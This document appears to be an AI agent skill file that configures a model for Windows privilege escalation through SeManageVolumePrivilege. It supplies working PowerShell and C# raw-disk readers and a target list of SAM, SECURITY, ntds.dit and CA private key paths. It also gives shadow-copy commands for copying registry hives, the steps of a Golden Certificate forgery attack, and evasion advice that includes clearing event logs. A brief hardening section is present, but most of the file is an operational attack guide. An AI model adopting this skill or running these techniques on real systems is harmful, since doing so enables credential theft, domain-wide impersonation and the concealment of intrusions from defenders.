---
name: windows-semanagevolume-privilege-escalation
description: Windows privilege escalation via SeManageVolumePrivilege (Perform volume maintenance tasks). Use this skill whenever the user mentions Windows privilege escalation, SeManageVolumePrivilege, raw volume access, bypassing file ACLs, reading protected system files, machine key exfiltration, CA private keys, Golden Certificate attacks, or any scenario where they need to read files they don't have NTFS permissions for. This skill provides techniques to open raw volume handles and read arbitrary disk sectors to exfiltrate sensitive data like DPAPI masterkeys, SAM hives, ntds.dit, and CA private keys.
---

# SeManageVolumePrivilege: Raw Volume Access for Privilege Escalation

## What This Skill Does

This skill teaches you how to abuse the `SeManageVolumePrivilege` (Perform volume maintenance tasks) user right to bypass NTFS file ACLs and read arbitrary files from disk. This is a powerful local privilege escalation technique that allows reading sensitive system files even when you lack file system permissions.

## When to Use This Skill

Use this skill when:
- You have `SeManageVolumePrivilege` and need to read protected files
- You're doing Windows privilege escalation and found this privilege assigned
- You need to exfiltrate machine keys, DPAPI masterkeys, or registry hives
- You're in an AD CS environment and want to forge Golden Certificates
- You need to read files in `C:\Windows\System32\` or other protected paths
- You want to understand how to bypass file ACLs via raw disk access

## Core Concept

The `SeManageVolumePrivilege` allows opening raw volume device handles (e.g., `\\.\C:`) and issuing direct disk I/O that bypasses NTFS file ACLs. You can read any file on the volume by parsing filesystem structures at the block/cluster level.

## Quick Start

### 1. Verify You Have the Privilege

```powershell
# Check if you have SeManageVolumePrivilege
whoami /priv | Select-String "SeManageVolumePrivilege"
```

Expected output: `SeManageVolumePrivilege` with `Enabled` state.

### 2. Read Raw Volume Data

Use the bundled scripts to read raw volume data:

```powershell
# PowerShell - read first MB from C:
.\scripts\raw-volume-reader.ps1 -Volume C: -Size 1MB -Output C:\temp\c_first_mb.bin

# C# - read specific offset
.\scripts\raw-volume-reader.cs -Volume C: -Offset 0x100000 -Size 4096 -Output C:\temp\blk.bin
```

### 3. Target Sensitive Files

Common high-value targets:

```
%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\      # Machine private keys
%ProgramData%\Microsoft\Crypto\Keys\                  # Additional key material
C:\Windows\System32\config\SAM                       # Local account hashes
C:\Windows\System32\config\SYSTEM                    # Boot keys for decryption
C:\Windows\System32\config\SECURITY                  # Security policy data
C:\Windows\NTDS\ntds.dit                             # Domain controller (via VSS)
C:\Windows\System32\CertSrv\CertEnroll\              # CA certificates
```

## Practical Techniques

### Technique 1: Direct Raw Volume Read (PowerShell)

```powershell
# Open raw volume handle and read data
$fs = [System.IO.File]::Open("\\.\C:", [System.IO.FileMode]::Open, 
                             [System.IO.FileAccess]::Read, 
                             [System.IO.FileShare]::ReadWrite)
$buf = New-Object byte[] (1MB)
$null = $fs.Read($buf, 0, $buf.Length)
$fs.Close()
[IO.File]::WriteAllBytes("C:\temp\c_first_mb.bin", $buf)
```

**Why this works**: The `\\.\C:` device path bypasses the file system and gives you direct access to the volume. NTFS ACLs don't apply to raw device handles.

### Technique 2: Read Specific Offset (C#)

```csharp
using System;
using System.IO;

class RawReader {
  static void Main(string[] args) {
    using(var fs = new FileStream("\\.\C:", FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
      fs.Position = 0x100000; // Seek to specific offset
      var buf = new byte[4096];
      fs.Read(buf, 0, buf.Length);
      File.WriteAllBytes("C:\temp\blk.bin", buf);
    }
  }
}
```

**Why this works**: You can seek to any offset on the volume, allowing you to read specific clusters where target files reside.

### Technique 3: Use NTFS-Aware Tools

For easier file recovery, use tools that understand NTFS structures:

- **RawCopy/RawCopy64**: Sector-level copy of in-use files
- **FTK Imager**: Read-only imaging, then carve files
- **The Sleuth Kit**: Forensic file carving
- **vssadmin/diskshadow**: Create shadow copy, then copy target file

```powershell
# Create VSS shadow copy (if you have admin)
vssadmin create shadow /for=C:

# List shadow copies
vssadmin list shadows

# Copy from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
```

## AD CS: Golden Certificate Attack

If you can read the Enterprise CA's private key from the machine key store, you can forge client-auth certificates for arbitrary principals.

### Attack Flow

1. **Exfiltrate CA private key** from `%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\`
2. **Extract CA certificate** from `C:\Windows\System32\CertSrv\CertEnroll\`
3. **Forge certificate** for arbitrary user (e.g., `krbtgt` or any domain user)
4. **Authenticate via PKINIT** using the forged certificate

### Why This Matters

Golden Certificates allow you to impersonate any domain principal, including high-value accounts. This is often more reliable than Golden Tickets because certificates are validated differently and may bypass some detection mechanisms.

## Detection and Evasion

### What Defenders Monitor

- Sensitive Privilege Use events (Event ID 4672)
- Process handle opens to device objects (`\\.\C:`, `\\.\PhysicalDrive0`)
- Unusual raw disk I/O patterns
- VSS shadow copy creation

### Evasion Tips

- Use legitimate tools (RawCopy, FTK Imager) rather than custom scripts
- Time operations during maintenance windows
- Use VSS shadow copies instead of direct raw reads when possible
- Clear event logs after operation (if you have admin)

## Hardening Recommendations

If you're defending against this attack:

1. **Limit SeManageVolumePrivilege**: Assign only to trusted admins
2. **Monitor device handle opens**: Alert on `\\.\C:` access
3. **Use HSM/TPM-backed CA keys**: Raw file reads won't recover usable keys
4. **Enable DPAPI-NG**: Protects key material from raw disk reads
5. **Separate upload/temp paths**: Prevent execution of extracted files

## References

- [Microsoft - Perform volume maintenance tasks](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [0xdf - HTB Certificate (SeManageVolumePrivilege → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
- [HackTricks - Windows Privilege Escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/semanagevolume-perform-volume-maintenance-tasks)

## Bundled Scripts

- `scripts/raw-volume-reader.ps1` - PowerShell raw volume reader
- `scripts/raw-volume-reader.cs` - C# raw volume reader with offset support
- `scripts/target-paths.txt` - Common sensitive file paths to target

Use these scripts as starting points. Modify them for your specific targets and environments.
